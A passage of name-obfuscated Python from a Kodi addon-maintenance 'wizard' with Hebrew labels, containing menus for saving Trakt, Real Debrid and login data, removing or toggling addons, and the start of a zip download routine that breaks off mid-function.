	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0OOO0OO0OOOOOO0 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OO0OO0O0O000000O0 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OO0OOOO0O0O00OO00 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O0O0OOOOOO0OOO000 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0OOO0O000OOOO0OO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3157
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O0OOO000O00OO0OOO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3158
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0000O0OOOOO00O0O .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת פליליסט לאודר:  '%O00OOOO0O00O00O00 .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות באפר: '%O0OOO0O0O000O000O .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת רשימות ריפו:  '%OO0OOOOOO00OOOOOO .replace ('true',O0000OOOO0OO00O0O ).replace ('false',O0OO00OOOO00000O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3168
	setView ('files','viewType')#line:3170
def traktMenu ():#line:3172
	O0OOO0O000OO0O000 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3173
	OOOOO0OO0OOO0O000 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3174
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3175
	addFile ('Save Trakt Data: %s'%O0OOO0O000OO0O000 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3176
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (OOOOO0OO0OOO0O000 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3177
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	for O0OOO0O000OO0O000 in traktit .ORDER :#line:3180
		OOOO00OO0OO0OO0OO =TRAKTID [O0OOO0O000OO0O000 ]['name']#line:3181
		OOOO0O0OO0O0OO00O =TRAKTID [O0OOO0O000OO0O000 ]['path']#line:3182
		OOOO00OOO0O0O0OOO =TRAKTID [O0OOO0O000OO0O000 ]['saved']#line:3183
		O00OOOOO0000O00OO =TRAKTID [O0OOO0O000OO0O000 ]['file']#line:3184
		OO00OOO0O00O00O0O =wiz .getS (OOOO00OOO0O0O0OOO )#line:3185
		O0O00O000OO000O0O =traktit .traktUser (O0OOO0O000OO0O000 )#line:3186
		OOOO0OOO0O00000OO =TRAKTID [O0OOO0O000OO0O000 ]['icon']if os .path .exists (OOOO0O0OO0O0OO00O )else ICONTRAKT #line:3187
		OO0OO0O00O00OO0OO =TRAKTID [O0OOO0O000OO0O000 ]['fanart']if os .path .exists (OOOO0O0OO0O0OO00O )else FANART #line:3188
		O000O00000O000000 =createMenu ('saveaddon','Trakt',O0OOO0O000OO0O000 )#line:3189
		O00O00OOO00O00000 =createMenu ('save','Trakt',O0OOO0O000OO0O000 )#line:3190
		O000O00000O000000 .append ((THEME2 %'%s Settings'%OOOO00OO0OO0OO0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0OOO0O000OO0O000 )))#line:3191
		addFile ('[+]-> %s'%OOOO00OO0OO0OO0OO ,'',icon =OOOO0OOO0O00000OO ,fanart =OO0OO0O00O00OO0OO ,themeit =THEME3 )#line:3193
		if not os .path .exists (OOOO0O0OO0O0OO00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOO0OOO0O00000OO ,fanart =OO0OO0O00O00OO0OO ,menu =O000O00000O000000 )#line:3194
		elif not O0O00O000OO000O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0OOO0O000OO0O000 ,icon =OOOO0OOO0O00000OO ,fanart =OO0OO0O00O00OO0OO ,menu =O000O00000O000000 )#line:3195
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00O000OO000O0O ,'authtrakt',O0OOO0O000OO0O000 ,icon =OOOO0OOO0O00000OO ,fanart =OO0OO0O00O00OO0OO ,menu =O000O00000O000000 )#line:3196
		if OO00OOO0O00O00O0O =="":#line:3197
			if os .path .exists (O00OOOOO0000O00OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0OOO0O000OO0O000 ,icon =OOOO0OOO0O00000OO ,fanart =OO0OO0O00O00OO0OO ,menu =O00O00OOO00O00000 )#line:3198
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0OOO0O000OO0O000 ,icon =OOOO0OOO0O00000OO ,fanart =OO0OO0O00O00OO0OO ,menu =O00O00OOO00O00000 )#line:3199
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO00OOO0O00O00O0O ,'',icon =OOOO0OOO0O00000OO ,fanart =OO0OO0O00O00OO0OO ,menu =O00O00OOO00O00000 )#line:3200
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3202
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3203
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3204
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3205
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	setView ('files','viewType')#line:3208
def realMenu ():#line:3210
	OOOOOO0O00O0O0OO0 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3211
	O00000O0OOOOO00OO =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3212
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3213
	addFile ('Save Real Debrid Data: %s'%OOOOOO0O00O0O0OO0 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3214
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O00000O0OOOOO00OO ),'',icon =ICONREAL ,themeit =THEME3 )#line:3215
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3216
	for O0OO0O0OO0000O00O in debridit .ORDER :#line:3218
		OOOOO00OOO00O000O =DEBRIDID [O0OO0O0OO0000O00O ]['name']#line:3219
		O00O00OO00000OOO0 =DEBRIDID [O0OO0O0OO0000O00O ]['path']#line:3220
		OO0OO000O0000OO00 =DEBRIDID [O0OO0O0OO0000O00O ]['saved']#line:3221
		O000OO0O0OO0O0O0O =DEBRIDID [O0OO0O0OO0000O00O ]['file']#line:3222
		OOO0O0O0O0O0O0OO0 =wiz .getS (OO0OO000O0000OO00 )#line:3223
		OOOOO00O000O0O0OO =debridit .debridUser (O0OO0O0OO0000O00O )#line:3224
		O0OO0O000O00OO0O0 =DEBRIDID [O0OO0O0OO0000O00O ]['icon']if os .path .exists (O00O00OO00000OOO0 )else ICONREAL #line:3225
		O0O0O00OOO00OO0O0 =DEBRIDID [O0OO0O0OO0000O00O ]['fanart']if os .path .exists (O00O00OO00000OOO0 )else FANART #line:3226
		OOOOO0OOO0O0O0O00 =createMenu ('saveaddon','Debrid',O0OO0O0OO0000O00O )#line:3227
		OO0OO0O0000OO0O00 =createMenu ('save','Debrid',O0OO0O0OO0000O00O )#line:3228
		OOOOO0OOO0O0O0O00 .append ((THEME2 %'%s Settings'%OOOOO00OOO00O000O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O0OO0O0OO0000O00O )))#line:3229
		addFile ('[+]-> %s'%OOOOO00OOO00O000O ,'',icon =O0OO0O000O00OO0O0 ,fanart =O0O0O00OOO00OO0O0 ,themeit =THEME3 )#line:3231
		if not os .path .exists (O00O00OO00000OOO0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0OO0O000O00OO0O0 ,fanart =O0O0O00OOO00OO0O0 ,menu =OOOOO0OOO0O0O0O00 )#line:3232
		elif not OOOOO00O000O0O0OO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O0OO0O0OO0000O00O ,icon =O0OO0O000O00OO0O0 ,fanart =O0O0O00OOO00OO0O0 ,menu =OOOOO0OOO0O0O0O00 )#line:3233
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO00O000O0O0OO ,'authdebrid',O0OO0O0OO0000O00O ,icon =O0OO0O000O00OO0O0 ,fanart =O0O0O00OOO00OO0O0 ,menu =OOOOO0OOO0O0O0O00 )#line:3234
		if OOO0O0O0O0O0O0OO0 =="":#line:3235
			if os .path .exists (O000OO0O0OO0O0O0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O0OO0O0OO0000O00O ,icon =O0OO0O000O00OO0O0 ,fanart =O0O0O00OOO00OO0O0 ,menu =OO0OO0O0000OO0O00 )#line:3236
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O0OO0O0OO0000O00O ,icon =O0OO0O000O00OO0O0 ,fanart =O0O0O00OOO00OO0O0 ,menu =OO0OO0O0000OO0O00 )#line:3237
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO0O0O0O0O0O0OO0 ,'',icon =O0OO0O000O00OO0O0 ,fanart =O0O0O00OOO00OO0O0 ,menu =OO0OO0O0000OO0O00 )#line:3238
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3240
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3241
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3242
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3243
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	setView ('files','viewType')#line:3246
def loginMenu ():#line:3248
	OO0O0O00OOO00OOO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3249
	O00000OOO00OOOO0O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3250
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3251
	addFile ('Save Login Data: %s'%OO0O0O00OOO00OOO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3252
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O00000OOO00OOOO0O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3253
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	for OO0O0O00OOO00OOO0 in loginit .ORDER :#line:3256
		OO000O0OOOO0O0O0O =LOGINID [OO0O0O00OOO00OOO0 ]['name']#line:3257
		OOOO00O0O0O0000OO =LOGINID [OO0O0O00OOO00OOO0 ]['path']#line:3258
		O0OOOO00OO00OOO00 =LOGINID [OO0O0O00OOO00OOO0 ]['saved']#line:3259
		O00000000O000OO0O =LOGINID [OO0O0O00OOO00OOO0 ]['file']#line:3260
		OOO00OO00OOO0O00O =wiz .getS (O0OOOO00OO00OOO00 )#line:3261
		OO00000OOO0OO0O00 =loginit .loginUser (OO0O0O00OOO00OOO0 )#line:3262
		O0O0O000O0OOO0OO0 =LOGINID [OO0O0O00OOO00OOO0 ]['icon']if os .path .exists (OOOO00O0O0O0000OO )else ICONLOGIN #line:3263
		OO0O0OOO000000O0O =LOGINID [OO0O0O00OOO00OOO0 ]['fanart']if os .path .exists (OOOO00O0O0O0000OO )else FANART #line:3264
		OOO0000OO000OOOO0 =createMenu ('saveaddon','Login',OO0O0O00OOO00OOO0 )#line:3265
		O00OOO00OO0O00000 =createMenu ('save','Login',OO0O0O00OOO00OOO0 )#line:3266
		OOO0000OO000OOOO0 .append ((THEME2 %'%s Settings'%OO000O0OOOO0O0O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OO0O0O00OOO00OOO0 )))#line:3267
		addFile ('[+]-> %s'%OO000O0OOOO0O0O0O ,'',icon =O0O0O000O0OOO0OO0 ,fanart =OO0O0OOO000000O0O ,themeit =THEME3 )#line:3269
		if not os .path .exists (OOOO00O0O0O0000OO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O0O000O0OOO0OO0 ,fanart =OO0O0OOO000000O0O ,menu =OOO0000OO000OOOO0 )#line:3270
		elif not OO00000OOO0OO0O00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OO0O0O00OOO00OOO0 ,icon =O0O0O000O0OOO0OO0 ,fanart =OO0O0OOO000000O0O ,menu =OOO0000OO000OOOO0 )#line:3271
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO00000OOO0OO0O00 ,'authlogin',OO0O0O00OOO00OOO0 ,icon =O0O0O000O0OOO0OO0 ,fanart =OO0O0OOO000000O0O ,menu =OOO0000OO000OOOO0 )#line:3272
		if OOO00OO00OOO0O00O =="":#line:3273
			if os .path .exists (O00000000O000OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OO0O0O00OOO00OOO0 ,icon =O0O0O000O0OOO0OO0 ,fanart =OO0O0OOO000000O0O ,menu =O00OOO00OO0O00000 )#line:3274
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OO0O0O00OOO00OOO0 ,icon =O0O0O000O0OOO0OO0 ,fanart =OO0O0OOO000000O0O ,menu =O00OOO00OO0O00000 )#line:3275
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OOO00OO00OOO0O00O ,'',icon =O0O0O000O0OOO0OO0 ,fanart =OO0O0OOO000000O0O ,menu =O00OOO00OO0O00000 )#line:3276
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3278
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3279
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3280
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3281
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	setView ('files','viewType')#line:3284
def fixUpdate ():#line:3286
	if KODIV <17 :#line:3287
		O00OOO0000000O000 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3288
		try :#line:3289
			os .remove (O00OOO0000000O000 )#line:3290
		except Exception as O0OO0O0OO0O00OO0O :#line:3291
			wiz .log ("Unable to remove %s, Purging DB"%O00OOO0000000O000 )#line:3292
			wiz .purgeDb (O00OOO0000000O000 )#line:3293
	else :#line:3294
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3295
def removeAddonMenu ():#line:3297
	O0O0OO00000OOOO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3298
	OOOO0OO00OOOO000O =[];OO0OOOO0OOO0OO0OO =[]#line:3299
	for OOO00O00OO00OO0O0 in sorted (O0O0OO00000OOOO0O ,key =lambda O0000OOO0OOOOO000 :O0000OOO0OOOOO000 ):#line:3300
		O0O0OO000OOO0O0O0 =os .path .split (OOO00O00OO00OO0O0 [:-1 ])[1 ]#line:3301
		if O0O0OO000OOO0O0O0 in EXCLUDES :continue #line:3302
		elif O0O0OO000OOO0O0O0 in DEFAULTPLUGINS :continue #line:3303
		elif O0O0OO000OOO0O0O0 =='packages':continue #line:3304
		O00O0OOOO000O0OO0 =os .path .join (OOO00O00OO00OO0O0 ,'addon.xml')#line:3305
		if os .path .exists (O00O0OOOO000O0OO0 ):#line:3306
			OOOOOO000O000O000 =open (O00O0OOOO000O0OO0 )#line:3307
			O0OO0OO0OOO0O00OO =OOOOOO000O000O000 .read ()#line:3308
			OOO0OOOO0OO0OOO0O =wiz .parseDOM (O0OO0OO0OOO0O00OO ,'addon',ret ='id')#line:3309
			OO0O0O0000000O00O =O0O0OO000OOO0O0O0 if len (OOO0OOOO0OO0OOO0O )==0 else OOO0OOOO0OO0OOO0O [0 ]#line:3311
			try :#line:3312
				O0OOO0OOOOOOO0000 =xbmcaddon .Addon (id =OO0O0O0000000O00O )#line:3313
				OOOO0OO00OOOO000O .append (O0OOO0OOOOOOO0000 .getAddonInfo ('name'))#line:3314
				OO0OOOO0OOO0OO0OO .append (OO0O0O0000000O00O )#line:3315
			except :#line:3316
				pass #line:3317
	if len (OOOO0OO00OOOO000O )==0 :#line:3318
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3319
		return #line:3320
	if KODIV >16 :#line:3321
		OOO00OOOO00OO0O00 =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOO0OO00OOOO000O )#line:3322
	else :#line:3323
		OOO00OOOO00OO0O00 =[];O0OOOO00O0OOOO00O =0 #line:3324
		OOO000O0OO0OO0OOO =["-- Click here to Continue --"]+OOOO0OO00OOOO000O #line:3325
		while not O0OOOO00O0OOOO00O ==-1 :#line:3326
			O0OOOO00O0OOOO00O =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO000O0OO0OO0OOO )#line:3327
			if O0OOOO00O0OOOO00O ==-1 :break #line:3328
			elif O0OOOO00O0OOOO00O ==0 :break #line:3329
			else :#line:3330
				O0OO0OO0O0OOOOOO0 =(O0OOOO00O0OOOO00O -1 )#line:3331
				if O0OO0OO0O0OOOOOO0 in OOO00OOOO00OO0O00 :#line:3332
					OOO00OOOO00OO0O00 .remove (O0OO0OO0O0OOOOOO0 )#line:3333
					OOO000O0OO0OO0OOO [O0OOOO00O0OOOO00O ]=OOOO0OO00OOOO000O [O0OO0OO0O0OOOOOO0 ]#line:3334
				else :#line:3335
					OOO00OOOO00OO0O00 .append (O0OO0OO0O0OOOOOO0 )#line:3336
					OOO000O0OO0OO0OOO [O0OOOO00O0OOOO00O ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOOO0OO00OOOO000O [O0OO0OO0O0OOOOOO0 ])#line:3337
	if OOO00OOOO00OO0O00 ==None :return #line:3338
	if len (OOO00OOOO00OO0O00 )>0 :#line:3339
		wiz .addonUpdates ('set')#line:3340
		for O00O0OOO000OOOO00 in OOO00OOOO00OO0O00 :#line:3341
			removeAddon (OO0OOOO0OOO0OO0OO [O00O0OOO000OOOO00 ],OOOO0OO00OOOO000O [O00O0OOO000OOOO00 ],True )#line:3342
		xbmc .sleep (1000 )#line:3344
		if INSTALLMETHOD ==1 :OO0OOOO000OOOO00O =1 #line:3346
		elif INSTALLMETHOD ==2 :OO0OOOO000OOOO00O =0 #line:3347
		else :OO0OOOO000OOOO00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3348
		if OO0OOOO000OOOO00O ==1 :wiz .reloadFix ('remove addon')#line:3349
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3350
def removeAddonDataMenu ():#line:3352
	if os .path .exists (ADDOND ):#line:3353
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3354
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3355
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3357
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3358
		OOOOOOOOOOO0O0000 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3359
		for OOOO0O00O0000O00O in sorted (OOOOOOOOOOO0O0000 ,key =lambda OOO0OO0OOOOOOO000 :OOO0OO0OOOOOOO000 ):#line:3360
			OO0O00OOOOO0O0000 =OOOO0O00O0000O00O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3361
			OOOOOO000OO00OO0O =os .path .join (OOOO0O00O0000O00O .replace (ADDOND ,ADDONS ),'icon.png')#line:3362
			O0OO0OO00OOOOO00O =os .path .join (OOOO0O00O0000O00O .replace (ADDOND ,ADDONS ),'fanart.png')#line:3363
			OO00OOO0O0O000OOO =OO0O00OOOOO0O0000 #line:3364
			OO00O0OO00000OOOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3365
			for OOOO00O00OO00O00O in OO00O0OO00000OOOO :#line:3366
				OO00OOO0O0O000OOO =OO00OOO0O0O000OOO .replace (OOOO00O00OO00O00O ,OO00O0OO00000OOOO [OOOO00O00OO00O00O ])#line:3367
			if OO0O00OOOOO0O0000 in EXCLUDES :OO00OOO0O0O000OOO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO00OOO0O0O000OOO #line:3368
			else :OO00OOO0O0O000OOO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO00OOO0O0O000OOO #line:3369
			addFile (' %s'%OO00OOO0O0O000OOO ,'removedata',OO0O00OOOOO0O0000 ,icon =OOOOOO000OO00OO0O ,fanart =O0OO0OO00OOOOO00O ,themeit =THEME2 )#line:3370
	else :#line:3371
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3372
	setView ('files','viewType')#line:3373
def enableAddons ():#line:3375
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3376
	OO00O00O0OOOOO000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3377
	OOOO0O0O00OO00000 =0 #line:3378
	for OOO00O00OO0OO0000 in sorted (OO00O00O0OOOOO000 ,key =lambda O00O00O000O0O00O0 :O00O00O000O0O00O0 ):#line:3379
		OOOOOOO0OO000OOOO =os .path .split (OOO00O00OO0OO0000 [:-1 ])[1 ]#line:3380
		if OOOOOOO0OO000OOOO in EXCLUDES :continue #line:3381
		if OOOOOOO0OO000OOOO in DEFAULTPLUGINS :continue #line:3382
		O0OO00OO0O0O00O0O =os .path .join (OOO00O00OO0OO0000 ,'addon.xml')#line:3383
		if os .path .exists (O0OO00OO0O0O00O0O ):#line:3384
			OOOO0O0O00OO00000 +=1 #line:3385
			OO00O00O0OOOOO000 =OOO00O00OO0OO0000 .replace (ADDONS ,'')[1 :-1 ]#line:3386
			O00OOO0OO0000OOO0 =open (O0OO00OO0O0O00O0O )#line:3387
			OOO00O00000OO0OO0 =O00OOO0OO0000OOO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3388
			OO00OOO0OOO000OOO =wiz .parseDOM (OOO00O00000OO0OO0 ,'addon',ret ='id')#line:3389
			OOOOOOO000OO0OOO0 =wiz .parseDOM (OOO00O00000OO0OO0 ,'addon',ret ='name')#line:3390
			try :#line:3391
				OOO0OO000OOOOOO00 =OO00OOO0OOO000OOO [0 ]#line:3392
				O00000OO0OOO0OO00 =OOOOOOO000OO0OOO0 [0 ]#line:3393
			except :#line:3394
				continue #line:3395
			try :#line:3396
				OO00O00O000OO00OO =xbmcaddon .Addon (id =OOO0OO000OOOOOO00 )#line:3397
				O00OO0000O0OOO000 ="[COLOR green][Enabled][/COLOR]"#line:3398
				OOOOOO0O00OOO0OO0 ="false"#line:3399
			except :#line:3400
				O00OO0000O0OOO000 ="[COLOR red][Disabled][/COLOR]"#line:3401
				OOOOOO0O00OOO0OO0 ="true"#line:3402
				pass #line:3403
			O0O0O00OOO0O00O00 =os .path .join (OOO00O00OO0OO0000 ,'icon.png')if os .path .exists (os .path .join (OOO00O00OO0OO0000 ,'icon.png'))else ICON #line:3404
			O000O0OO0OO000000 =os .path .join (OOO00O00OO0OO0000 ,'fanart.jpg')if os .path .exists (os .path .join (OOO00O00OO0OO0000 ,'fanart.jpg'))else FANART #line:3405
			addFile ("%s %s"%(O00OO0000O0OOO000 ,O00000OO0OOO0OO00 ),'toggleaddon',OO00O00O0OOOOO000 ,OOOOOO0O00OOO0OO0 ,icon =O0O0O00OOO0O00O00 ,fanart =O000O0OO0OO000000 )#line:3406
			O00OOO0OO0000OOO0 .close ()#line:3407
	if OOOO0O0O00OO00000 ==0 :#line:3408
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3409
	setView ('files','viewType')#line:3410
def changeFeq ():#line:3412
	O00OO0OOO0OOO00OO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3413
	OO00000OO0OOO00OO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O00OO0OOO0OOO00OO )#line:3414
	if not OO00000OO0OOO00OO ==-1 :#line:3415
		wiz .setS ('autocleanfeq',str (OO00000OO0OOO00OO ))#line:3416
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O00OO0OOO0OOO00OO [OO00000OO0OOO00OO ]))#line:3417
def developer ():#line:3419
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3420
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3421
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3422
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3423
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3424
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3425
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3426
	setView ('files','viewType')#line:3428
def download (O000O0O0000OO0000 ,O0OOOO0OOO0O0OO00 ):#line:3433
  OOO0OO00O000000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3434
  O0OO0OO000OO000O0 =xbmcgui .DialogProgress ()#line:3435
  O0OO0OO000OO000O0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3436
  OOO0OOOO0OO000O0O =os .path .join (OOO0OO00O000000OO ,'isr.zip')#line:3437
  O0OOO0000OOO0OO0O =urllib2 .Request (O000O0O0000OO0000 )#line:3438
  O0OOO000000O0OOOO =urllib2 .urlopen (O0OOO0000OOO0OO0O )#line:3439
  O0O00O0OO0O00OO00 =xbmcgui .DialogProgress ()#line:3441
  O0O00O0OO0O00OO00 .create ("Downloading","Downloading "+name )#line:3442
  O0O00O0OO0O00OO00 .update (0 )#line:3443
  O0OO0OO0O0OOO000O =O0OOOO0OOO0O0OO00 #line:3444
